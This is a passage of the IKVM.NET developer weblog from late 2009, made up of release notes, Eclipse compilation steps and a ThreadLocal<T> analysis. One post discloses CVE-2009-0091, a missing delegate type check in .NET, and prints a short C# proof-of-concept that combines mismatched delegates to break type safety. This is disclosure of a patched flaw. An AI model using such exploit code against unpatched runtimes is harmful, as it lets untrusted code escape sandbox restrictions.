		<P>The 0.42 release still isn't done, but in the mean time, development of 0.43 continues.<BR><BR>Changes:</P>
<UL>
<LI>Fixed interface method resolution (via JNI) and various other minor JNI method resolution compatibility tweaks.</LI>
<LI>When there is no Java code on the stack JNIEnv-&gt;FindClass() should use the system class loader instead of the boot class loader.</LI>
<LI>Removed micro optimization that requires full trust on .NET 4.0.</LI>
<LI>Removed .NET 4.0 workaround.</LI>
<LI>Renamed ILGenerator.__GetILOffset() to ILGenerator.ILOffset to match with .NET 4.0.</LI>
<LI>More AWT fixes by Volker</LI>
<LI>Added support for adding "new-style" declarative security (i.e. .NET 2.0 compatible) to IKVM.Reflection.Emit.</LI>
<LI>Various minor optimizations</LI>
<LI>Added a couple of missing classes (that tools.jar depends on).</LI>
<LI>Removed classes that aren't supposed to be in the boot class path (they're from tools.jar). This includes the entire IKVM.OpenJDK.XML.RelaxNG assembly.</LI>
<LI>Created IKVM.OpenJDK.Tools.dll (which is going to be the equivalent of tools.jar).</LI>
<LI>Fixed IsPackageAccessibleFrom to consider class loaders, instead of InternalsVisibleToAttribute</LI>
<LI>Added automatic access to internal accessibility members across assemblies in multi target compilation (previously this was only done for -sharedclassloader scenarios)</LI>
<LI>Cleaned up existing field access stubs (now known as "type 1") and added type 2 access stubs to make public fields that have a non-public field type accessible.</LI>
<LI>Moved FindMainMethod from ikvm.exe into runtime, to avoid the need for hacks (to avoid NoClassDefFoundErrors).</LI>
<LI>Deleting of an non existing Preferences Key should not throw an exception.</LI>
<LI>Type export map performance bug fix by Eyal Alaluf. AssemblyName doesn't implement Equals/GetHashCode and this caused the map to contain an assembly entry for every type.</LI>
<LI>Added IKVM_EXPERIMENTAL_JDK_7 environment variable to enable loading Java 7 class files. Note that no JDK 7 functionality has been implemented yet.</LI>
<LI>Mangle all artificial type names if they clash with Java type names in the same assembly.</LI>
<LI>Added two constructors to ThowsAttribute that take a Type and a Type[] for greater convenience when applying the attribute to user code and for compatibility with Grasshopper's ThrowsAttribute.</LI>
<LI>Various minor reflection optimizations.</LI>
<LI>Don't automatically hide Java "op_Implicit" methods (marked with SpecialName). Instead mark the ones we automatically generate with HideFromJavaAttribute.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.43.3628.zip">ikvmbin-0.43.3628.zip</A><BR></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/07/2009 09:06:05 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=7036bafb-e65f-45f3-a333-5d0307d154f6"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=7036bafb-e65f-45f3-a333-5d0307d154f6">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 30 November 2009</h2></div>
<div class="newsItems"><a name="a8ca44111-f200-4e14-8075-4aaedb8969f7"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.42 Release Candidate 3</h3>
	<div class="entryBody">
		<P>A new release candidate is available.<BR><BR>Changes since previous release candidate:</P>
<UL>
<LI>Changed version to 0.42.0.3.</LI>
<LI>Fix for bug <A href="http://sourceforge.net/tracker/?func=detail&amp;aid=2887316&amp;group_id=69637&amp;atid=525264">#2887316</A>.</LI>
<LI>Eyal Alaluf fixed a massive performance bug that caused IKVM.OpenJDK.Core.dll to be 1.4 MB too big and allocate a couple of MB of unnecessary strings on initialization.</LI>
<LI>Fixed JNI to use system class loader instead of bootstrap class loader when no Java code is on the stack.</LI>
<LI>Fixed JNI method lookup algorithm.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.42.0.3.zip">ikvmbin-0.42.0.3.zip</A><BR><BR>Sources: <A href="http://www.frijters.net/ikvm-0.42.0.3.zip">ikvm-0.42.0.3.zip</A>, <A href="http://www.frijters.net/openjdk6-b16-stripped.zip">openjdk6-b16-stripped.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/30/2009 07:00:02 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=8ca44111-f200-4e14-8075-4aaedb8969f7"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=8ca44111-f200-4e14-8075-4aaedb8969f7">Comments [4]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 25 November 2009</h2></div>
<div class="newsItems"><a name="a1aecaf4e-24c0-4f96-861b-f3b4473c7525"></a><div class="entry">
	<h3 class="entryTitle">Running Eclipse with NGEN</h3>
	<div class="entryBody">
		<P>In the weeks before PDC I've been working on compiling Eclipse with ikvmc. This works was triggered by Mainsoft's Eyal Alaluf who asked me to work on this and also provided a desperately needed starting point. I had wanted to do this for ages, but didn't feel like struggling with the Eclipse build system to figure out how to get started.</P>
<P>A couple of the changes in the most <A href="/PermaLink.aspx?guid=de793ed8-a01e-4ce4-ae12-49c02d4b03fa">recent development snapshot</A> are specifically related to this. In particular the ability for custom assembly class loaders to be called when the module initializer is run. This enables the statically compiled Eclipse OSGi bundles to be lazily activated on first use.</P>
<P><B>Instructions</B></P>
<P>Here are the steps needed to compile Eclipse 3.4.2 x86 on Windows:</P>
<OL>
<LI>Download <A href="http://www.eclipse.org/downloads/download.php?file=/eclipse/downloads/drops/R-3.4.2-200902111700/eclipse-SDK-3.4.2-win32.zip">eclipse-SDK-3.4.2-win32.zip</A> 
<LI>Download <A href="http://www.frijters.net/ikvmbin-0.43.3595.zip">ikvmbin-0.43.3595.zip</A> 
<LI>Download <A href="http://www.frijters.net/ikvm-eclipse-0.1.zip">ikvm-eclipse-0.1.zip</A> 
<LI>Unzip eclipse-SDK-3.4.2-win32.zip 
<LI>Open a Command Prompt in the just unzipped eclipse directory 
<LI>Unzip ikvmbin-0.43.3595.zip in that directory 
<LI>Unzip ikvm-eclipse-0.1.zip in that directory 
<LI>Create a directory for the compiled plugins:<BR><CODE>md plugins-compiled</CODE> 
<LI>Run ikvmc to compile the eclipse plugins:<BR><CODE>ikvm\bin\ikvmc @response0.txt</CODE><BR><CODE>ikvm\bin\ikvmc @response1.txt</CODE><BR>(Ignore the warnings and note that this takes a while and requires a lot of memory. I haven't tested this on a 32 bit machine, it may well run out of address space there.) 
<LI>You can now run "eclipse-clr.exe" to start Eclipse. Note that if you compare startup times, the first time that Eclipse starts it does some initial configuration, so don't compare the first startup with the subsequent ones. 
<LI>Optionally you can run ngen-all.bat to compile all assemblies to native code. Make sure that you have the x86 version of ngen.exe in your path. Note that this also takes a while.</LI></OL>
<P><B>Source Code</B></P>
<P>The sources for eclipse-clr.exe are in <A href="http://www.frijters.net/eclipse-clr-0.1.zip">this Visual Studio 2008 solution</A>. It's pretty small and most of what it does is configure and hook OSGi to change the bundle loading and initialization. If you want to build eclipse-clr.exe, you first have to run ikvmc on response0.txt, then build eclipse-clr.exe (it depends on the OSGi assembly built with response0.txt) and after that you can run ikvmc on response1.txt (it depends on eclipse-clr.exe, because that contains the custom assembly class loader used for the bundles).</P>
<P>The response0.txt and response1.txt files were generated from the OSGi manifests and if there is interest I can publish the source to that as well, but is pretty hacky.</P>
<P><B>Performance</B></P>
<P>When compiled to native with ngen, Eclipse starts up faster than with JDK 1.6 on my systems. In theory the private working set should also be significantly less, allowing multiple Eclipse instances to use far less memory.</P>
<P><B>Disclaimer</B></P>
<P>This is just a technology demonstration, not production code and has not been extensively tested.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/25/2009 06:32:30 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=1aecaf4e-24c0-4f96-861b-f3b4473c7525"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=1aecaf4e-24c0-4f96-861b-f3b4473c7525">Comments [20]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 10 November 2009</h2></div>
<div class="newsItems"><a name="a1c7e28aa-c938-408b-856c-dfae456303e4"></a><div class="entry">
	<h3 class="entryTitle">Going Crazy with Generics, or The Story of ThreadLocal(Of T)</h3>
	<div class="entryBody">
		<P><A href="http://msmvps.com/blogs/jon_skeet/archive/2009/11/04/revisiting-randomness.aspx">Jon Skeet recently blogged</A> about the performance of [ThreadStatic] versus the new .NET 4.0 ThreadLocal&lt;T&gt;. I was surprised to see that ThreadLocal&lt;T&gt; was faster than [ThreadStatic], because ThreadLocal&lt;T&gt; uses [ThreadStatic] as the underlying primitive.</P>
<P>How do you go from a static field to a per instance field? It's simple, once you think of it. You (ab)use generic types. Here's a simplified ThreadLocal&lt;T&gt;:</P>
<P><CODE><FONT color=#0000ff>public class</FONT> <FONT color=#2b91af>ThreadLocal</FONT>&lt;T&gt;<BR>{<BR>&nbsp; <FONT color=#2b91af>HolderBase</FONT> holder;<BR>&nbsp; <FONT color=#0000ff>static int</FONT> count;<BR>&nbsp; <FONT color=#0000ff>static</FONT> <FONT color=#2b91af>Type</FONT>[] types = <FONT color=#0000ff>new</FONT> <FONT color=#2b91af>Type</FONT>[] { <FONT color=#0000ff>typeof</FONT>(<FONT color=#2b91af>C1</FONT>), <FONT color=#0000ff>typeof</FONT>(<FONT color=#2b91af>C2</FONT>), <FONT color=#0000ff>typeof</FONT>(<FONT color=#2b91af>C3</FONT>) };<BR><BR>&nbsp; <FONT color=#0000ff>abstract class</FONT> <FONT color=#2b91af>HolderBase</FONT><BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>internal abstract</FONT> T Value { <FONT color=#0000ff>get</FONT>; <FONT color=#0000ff>set</FONT>; }<BR>&nbsp; }<BR><BR>&nbsp; <FONT color=#0000ff>class</FONT> <FONT color=#2b91af>C1</FONT> { }<BR>&nbsp; <FONT color=#0000ff>class</FONT> <FONT color=#2b91af>C2</FONT> { }<BR>&nbsp; <FONT color=#0000ff>class</FONT> <FONT color=#2b91af>C3</FONT> { }<BR><BR>&nbsp; <FONT color=#0000ff>class</FONT> <FONT color=#2b91af>Holder</FONT><T1, T3 T2,> : <FONT color=#2b91af>HolderBase</FONT><BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; [<FONT color=#2b91af>ThreadStatic</FONT>]<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>static</FONT> T val;<BR><BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>internal override</FONT> T Value<BR>&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>get</FONT> { <FONT color=#0000ff>return</FONT> val; }<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>set</FONT> { val = <FONT color=#0000ff>value</FONT>; }<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp; }<BR><BR>&nbsp; <FONT color=#0000ff>public</FONT> ThreadLocal()<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; holder = MakeHolder(<FONT color=#2b91af>Interlocked</FONT>.Increment(<FONT color=#0000ff>ref</FONT> count) - 1);<BR>&nbsp; }<BR><BR>&nbsp; <FONT color=#2b91af>HolderBase</FONT> MakeHolder(<FONT color=#0000ff>int</FONT> index)<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>Type</FONT> t1 = types[index % 3];<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>Type</FONT> t2 = types[(index / 3) % 3];<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>Type</FONT> t3 = types[index / 9];<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>Type</FONT> type = <FONT color=#0000ff>typeof</FONT>(<FONT color=#2b91af>Holder</FONT>&lt;,,&gt;).MakeGenericType(<FONT color=#0000ff>typeof</FONT>(T), t1, t2, t3);<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>return</FONT> (<FONT color=#2b91af>HolderBase</FONT>)<FONT color=#2b91af>Activator</FONT>.CreateInstance(type);<BR>&nbsp; }<BR><BR>&nbsp; <FONT color=#0000ff>public</FONT> T Value<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>get</FONT> { <FONT color=#0000ff>return</FONT> holder.Value; }<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>set</FONT> { holder.Value = <FONT color=#0000ff>value</FONT>; }<BR>&nbsp; }<BR>}</CODE></P>
<P>The real ThreadLocal&lt;T&gt; type in .NET 4.0 beta 2 is much more complex, because it has to deal with recycling the types and protecting against returning a value from a recycled type. It also uses a higher base counting system&nbsp; to number the types, the maximum number of types generated (per T) is 4096 in beta 2. After you allocate more than that, it falls back to using a holder type that uses Thread.SetData().</P>
<P>I'm not sure what to make of this. It's a clever trick, but I think it ultimately is too clever. I benchmarked a simpler approach using arrays (where each ThreadLocal&lt;T&gt; simply allocated an index in the [ThreadStatic] array) and it was a little bit faster and doesn't suffer from the downsides of creating a gazillion types (which probably take more memory and those types stay around until the AppDomain is destroyed).</P>
<P>Finally a tip for Microsoft, move the Cn types out of ThreadLocal, because currently they are also generic (due to the fact that C# automatically makes nested types generic based on the outer type's generic type parameters) and that is unnecessarily wasteful.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/10/2009 07:03:31 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=1c7e28aa-c938-408b-856c-dfae456303e4"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=1c7e28aa-c938-408b-856c-dfae456303e4">Comments [6]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 04 November 2009</h2></div>
<div class="newsItems"><a name="ade793ed8-a01e-4ce4-ae12-49c02d4b03fa"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>While the 0.42 release is still baking, a new development snapshot is available.</P>
<P>Changes:</P>
<UL>
<LI>Nat worked on clipboard and drag-and-drop support.</LI>
<LI>Volker worked on print support.</LI>
<LI>Various awt fixes/improvements.</LI>
<LI>Code cleanup/refactoring to prepare for IKVM.Reflection (replacement of IKVM.Reflection.Emit).</LI>
<LI>Fixed ikvmstub to ignore private interfaces.</LI>
<LI>Removed .NET 4.0 beta 1 workarounds.</LI>
<LI>Simplified the obj1.getClass() == obj2.getClass() intrinsic to avoid requiring full trust on .NET 4.0.</LI>
<LI>Optimized field reflection. We now delay creating the dynamic methods to access the field until after the field has been accessed a couple of times, this saves a lot of memory for fields that are only usused a few times.</LI>
<LI>Added -publicpackage:&lt;pkg&gt; option to ikvmc. Contributed by Eyal Alaluf of Mainsoft.</LI>
<LI>Added public API to get ClassLoader from Assembly.</LI>
<LI>Added (optional) per-module initialization to custom assembly class loaders.</LI>
<LI>Added ikvmc option -nopeercrossreference and the ability to use -r with peer assemblies.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.43.3595.zip">ikvmbin-0.43.3595.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/04/2009 15:23:41 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=de793ed8-a01e-4ce4-ae12-49c02d4b03fa"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=de793ed8-a01e-4ce4-ae12-49c02d4b03fa">Comments [5]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 27 October 2009</h2></div>
<div class="newsItems"><a name="ad1c6348b-acb9-4997-82b0-10a85d70e22a"></a><div class="entry">
	<h3 class="entryTitle">MS09-061 Vulnerability Details</h3>
	<div class="entryBody">
		<P>On "Patch Tuesday" two weeks ago Microsoft released security bulletin <A href="http://www.microsoft.com/technet/security/Bulletin/MS09-061.mspx">MS09-061</A>. This bulletin describes three issues, one of which I reported to Microsoft on <A HREF="/PermaLink.aspx?guid=e548c92d-42f7-4691-8b76-83adc59001f8">September 12, 2008</A>. I will describe the details of what is now known as <A href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0091">CVE-2009-0091</A>. I have no inside knowledge of the other two vulnerabilities.</P>
<P>As mentioned in the original blog entry, I found the bug while browsing the <A href="http://www.microsoft.com/downloads/details.aspx?FamilyID=8c09fd61-3f26-4555-ae17-3121b4f51d4d&amp;displaylang=en">Rotor</A> sources. Here's the fragment that caught my eye:</P>
<P><CODE><FONT color=#008000>&nbsp;&nbsp;&nbsp; // This method will combine this delegate with the passed delegate<BR>&nbsp;&nbsp;&nbsp; // to form a new delegate.</FONT><BR><FONT color=#0000ff>&nbsp;&nbsp;&nbsp; protected override sealed</FONT> <FONT color=#2b91af>Delegate</FONT> CombineImpl(<FONT color=#2b91af>Delegate</FONT> follow)<BR>&nbsp;&nbsp;&nbsp; {<BR><FONT color=#008000>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // Verify that the types are the same...<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // Actually, we don't need to do this, because Delegate.Combine already checks this.<BR>//&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (!InternalEqualTypes(this, follow)<BR>//&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; throw new ArgumentException(...)</FONT></CODE></P>
<P>This is from <A href="http://www.koders.com/csharp/fid0CEAECF1A5FE5FD63AD9A545B67380CA53D5CFFD.aspx?s=idef:system#L252">multicastdelegate.cs</A> (<B>Warning</B>: this link leads to <B>Microsoft Shared Source</B> licensed code).</P>
<P>The code that is commented out is a security check. After seeing this I immediately confirmed (using ildasm) that the, at that time current, production version of mscorlib also didn't include the check. I also checked .NET 1.1 and in that version the check is present. I also checked a pre-release version of Silverlight 2.0 and it also didn't include the check. The subsequent Silverlight 2.0 release on <A href="http://weblogs.asp.net/scottgu/archive/2008/10/14/silverlight-2-released.aspx">October 14, 2008</A> included the fix. Microsoft did not find it necessary to credit me with the fix (not even privately).</P>
<P><B>Why Is This a Security Vulnerability?</B></P>
<P>In my <A HREF="/PermaLink.aspx?guid=3cc8beef-3424-488d-8429-50e244f15ccc">example type safety exploit</A>, I used a union to bypass type safety. That wasn't an actual security vulnerability because such a union requires full trust. However, if we can combine two different delegate types we can do the same and because of the missing type check this was possible.</P>
<P>If you take <A href="http://www.frijters.net/TypeSafetyExploitPoC.cs.txt">TypeSafetyExploitPoC.cs</A> and replace the TypeSystemHole method with the following and add a reference to an assembly containing <A href="http://www.frijters.net/CombinePoCHelper.il.txt">CombinePoCHelper.il</A> (written in MSIL because that is the easiest way to write your own MulticastDelegate subclass that can call the protected CombineImpl method).</P>
<P><CODE><FONT color=#0000ff>delegate void</FONT> AnotherDelegate(<FONT color=#2b91af>Union1</FONT> u2); <BR><BR><FONT color=#0000ff>static</FONT> <FONT color=#2b91af>Union1</FONT> TypeSystemHole(<FONT color=#2b91af>Union2</FONT> u2)<BR>{<BR><FONT color=#2b91af>&nbsp; Union1</FONT> u1 = <FONT color=#0000ff>null</FONT>;<BR><FONT color=#2b91af>&nbsp; CombineHelper</FONT> del1 = <FONT color=#0000ff>delegate</FONT> { };<BR><FONT color=#2b91af>&nbsp; AnotherDelegate</FONT> del2 = <FONT color=#0000ff>delegate</FONT>(<FONT color=#2b91af>Union1</FONT> u) { u1 = u; };<BR>&nbsp; del1 = (<FONT color=#2b91af>CombineHelper</FONT>)<FONT color=#2b91af>CombineHelper</FONT>.CombineHack(del1, del2);<BR>&nbsp; del1(u2);<BR><FONT color=#0000ff>&nbsp; return</FONT> u1;<BR>}</CODE></P>
<P>Voila!</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/27/2009 08:17:15 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=d1c6348b-acb9-4997-82b0-10a85d70e22a"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=d1c6348b-acb9-4997-82b0-10a85d70e22a">Comments [7]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 26 October 2009</h2></div>
<div class="newsItems"><a name="ae5724cd2-198d-4fe5-a178-05f894d1a599"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.42 Release Candidate 2</h3>
	<div class="entryBody">
		<P>A new release candidate is available.</P>
<P>Changes since previous release candidate:</P>
<UL>
<LI>Changed version to 0.42.0.2.</LI>
<LI>Fix for bug #<A href="http://sourceforge.net/support/tracker.php?aid=2883889">2883889</A>.</LI>
<LI>Fix for bug #<A href="http://sourceforge.net/support/tracker.php?aid=2881954">2881954</A>.</LI>
<LI>Fixed automagic serialization interop to work correctly in the face of a __WorkaroundBaseClass__ base type.</LI>
<LI>Small update for .NET 4.0 beta 2.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.42.0.2.zip">ikvmbin-0.42.0.2.zip</A></P>
<P>Sources: <A href="http://www.frijters.net/ikvm-0.42.0.2.zip">ikvm-0.42.0.2.zip</A>, <A href="http://www.frijters.net/openjdk6-b16-stripped.zip">openjdk6-b16-stripped.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/26/2009 06:06:45 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=e5724cd2-198d-4fe5-a178-05f894d1a599"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=e5724cd2-198d-4fe5-a178-05f894d1a599">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 19 October 2009</h2></div>
<div class="newsItems"><a name="a5942661b-b88f-4afb-9af7-46e56544b96c"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.42 Release Candidate 1</h3>
	<div class="entryBody">
		<P>A new release candidate is available.</P>
<P>Changes since previous release candidate:</P>
<UL>
<LI>Changed version to 0.42.0.1.</LI>
<LI>Fixed a regression introduced in 0.40 that caused a System.NotSupportedException to be thrown by ikvmc when compiling multiple targets where one target (indirectly) implements a non-public interface from another target. Thanks to Erik Vullings for reporting this.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.42.0.1.zip">ikvmbin-0.42.0.1.zip</A></P>
<P>Sources: <A href="http://www.frijters.net/ikvm-0.42.0.1.zip">ikvm-0.42.0.1.zip</A>, <A href="http://www.frijters.net/openjdk6-b16-stripped.zip">openjdk6-b16-stripped.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/19/2009 06:56:56 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=5942661b-b88f-4afb-9af7-46e56544b96c"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=5942661b-b88f-4afb-9af7-46e56544b96c">Comments [4]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 12 October 2009</h2></div>
<div class="newsItems"><a name="a9cbe1eaf-0b79-4d76-8a38-3cabcbe8209b"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.42 Release Candidate 0</h3>
	<div class="entryBody">
		<P>The first release candidate is available.</P>
<P>Changes since last 0.41 development snapshot:</P>
<UL>
<LI>Changed version to 0.42.0.0.</LI>
<LI>Fixed virtual file system regression that caused NullReferenceException when trying to access a non-existing directory.</LI>
<LI>Volker added some print support code.</LI>
<LI>Fixed assertion in ILGenerator.</LI>
<LI>Fixed regression in reflection introduced when we started allowing open generic types to be visible to Java (for stack walking).</LI>
<LI>Fixed bug #<A href="https://sourceforge.net/tracker/index.php?func=detail&amp;aid=2876211&amp;group_id=69637&amp;atid=525264">2876211</A>.</LI></UL>
<P>Binary available here: <A href="http://www.frijters.net/ikvmbin-0.42.0.0.zip">ikvmbin-0.42.0.0.zip</A></P>
<P>Sources: <A href="http://www.frijters.net/ikvm-0.42.0.0.zip">ikvm-0.42.0.0.zip</A>, <A href="http://www.frijters.net/openjdk6-b16-stripped.zip">openjdk6-b16-stripped.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/12/2009 06:43:34 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=9cbe1eaf-0b79-4d76-8a38-3cabcbe8209b"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=9cbe1eaf-0b79-4d76-8a38-3cabcbe8209b">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 02 October 2009</h2></div>
<div class="newsItems"><a name="a708725bc-c2e8-4794-9b6c-c54a4d3959dd"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>We're starting to prepare for the 0.42 release. This is the last 0.41 development snapshot.</P>
<P>Changes:</P>
<UL>
<LI>Added support for exposing open generic types as Java classes (special "handle" classes that can only be used for stack walking). Fixes bug <A href="https://sourceforge.net/tracker/index.php?func=detail&amp;aid=2843805&amp;group_id=69637&amp;atid=525264">#2843805</A>.</LI>
<LI>ArrayTypeWrapper: Fixed a race condition and avoid holding the lock while calling external code.</LI>
<LI>Removed vestigial compact framework support code.</LI>
<LI>Some source file restructuring (Moved DynamicTypeWrapper and DotNetTypeWrapper classes into their own source files and AssemblyClassLoader and BootstrapClassLoader clases into AssemblyClassLoader.cs).</LI>
<LI>Fixed regression introduced with recent label handling changes. Bug <A href="https://sourceforge.net/tracker/index.php?func=detail&amp;aid=2847725&amp;group_id=69637&amp;atid=525264">#2847725</A>.</LI>
<LI>Various AWT fixes by Nat and Volker.</LI>
<LI>Rewrote custom assembly class loader initialization to avoid running user code (static initializer) while holding a lock and to better handle invocation of getClassLoader() during the class loader constructor (or static initializer).</LI>
<LI>Added hack to expose more custom attributes from mscorlib as annotations.</LI></UL>
<P>Binary available here: <A href="http://www.frijters.net/ikvmbin-0.41.3562.zip">ikvmbin-0.41.3562.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/02/2009 06:58:51 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=708725bc-c2e8-4794-9b6c-c54a4d3959dd"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=708725bc-c2e8-4794-9b6c-c54a4d3959dd">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 25 August 2009</h2></div>
<div class="newsItems"><a name="a679704a5-3310-46d7-a4c4-3dcfac73cccd"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>Time for another snapshot as there have been a large number of changes since the previous snapshot. The Swing/AWT work that Volker and more recently also Nat have been doing has resulted in SwingSet2 now running quite nicely. Check out these screenshots:</P>
